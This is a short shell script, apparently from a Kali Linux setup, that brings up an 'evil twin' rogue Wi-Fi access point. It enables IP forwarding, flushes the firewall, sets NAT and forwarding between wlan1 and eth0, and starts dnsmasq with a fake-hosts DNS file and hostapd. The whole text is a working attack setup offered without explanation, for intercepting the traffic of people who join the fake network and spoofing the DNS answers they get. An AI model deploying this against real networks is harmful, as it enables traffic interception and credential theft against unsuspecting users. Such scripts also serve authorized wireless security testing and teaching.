sysctl -w net.ipv4.ip_forward=1
iptables -t nat -F
iptables -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o wlan1 -j ACCEPT
dnsmasq -C /home/kali/Desktop/AP-Evil-Twin/dnsmasq/dnsmasq.conf -H /home/kali/Desktop/AP-Evil-Twin/dnsmasq/fakehosts.conf
hostapd /home/kali/Desktop/AP-Evil-Twin/hostapd/hostapd.conf &
